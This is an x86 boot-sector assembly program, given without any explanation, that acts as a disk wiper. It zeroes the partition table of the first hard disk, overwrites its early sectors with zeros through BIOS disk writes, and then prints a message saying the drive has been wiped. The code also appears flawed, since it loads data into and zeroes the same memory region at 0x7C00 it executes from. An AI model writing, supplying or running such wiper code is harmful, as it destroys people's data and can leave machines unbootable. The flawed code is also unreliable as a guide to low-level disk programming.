[org 0x7C00]

start:
    xor ax, ax   
    mov ds, ax
    mov es, ax
    mov ss, ax
    mov sp, 0x7C00          

    call wipe_drive         
    jmp final_loop        


wipe_drive:

    call read_mbr           
    mov di, 0x7C00 + 0x1BE  
    mov cx, 64              
    xor al, al              
    rep stosb              
    call write_mbr         

    mov dh, 0x00           
.head_loop:
    mov cx, 0x0001         
.sector_loop:
    push cx
    push dx

    call prepare_buffer    
    
    mov ax, 0x0301         
    mov bx, 0x7C00         
    mov dl, 0x80           

    int 0x13

    pop dx
    pop cx

    inc cl                
    cmp cl, 19            
    jl .sector_loop

    inc dh                 
    cmp dh, 2              
    jl .head_loop
    ret


prepare_buffer:
    pusha
    mov di, 0x7C00
    mov cx, 512
    mov al, 0x00
    rep stosb
    popa
    ret

print_string:
    mov ah, 0x0E
.loop:
    lodsb
    test al, al
    jz .done
    int 0x10
    jmp .loop
.done:
    ret

read_mbr:
    mov ax, 0x0201 
    mov bx, 0x7C00
    mov cx, 0x0001
    mov dx, 0x0080
    int 0x13
    ret

write_mbr:
    mov ax, 0x0301    
    mov bx, 0x7C00
    mov cx, 0x0001
    mov dx, 0x0080
    int 0x13
    ret

final_loop:
    mov si, msg_success
    call print_string

.halt:
    hlt                   
    jmp .halt


msg_success: db 'This drive has been successfully wiped!', 0x0D, 0x0A, 0

times 510-($-$$) db 0
dw 0xAA55
